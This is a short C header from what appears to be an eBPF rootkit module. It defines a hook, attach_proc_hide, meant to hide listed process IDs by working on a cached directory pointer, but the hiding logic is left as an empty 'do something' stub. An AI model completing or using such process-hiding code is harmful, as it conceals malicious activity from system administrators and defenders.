#ifndef MOD_HIDE_PROC_H
#define MOD_HIDE_PROC_H

#include "../includes/bpf.h"
#include "../includes/config.h"

/**
 * Hide pid from a white list.
 */
static __always_inline int attach_proc_hide(long ret){
    if(ret < 0)
        return ret;

    //get element from cache.
    __u32 key   = 0;
    __u64 *addr = bpf_map_lookup_elem(&hide_proc_dirp_cache, &key);

    if(!addr || *addr == 0)
        return ret;

    
    /**
     * do something
     */

    return ret;
}

#endif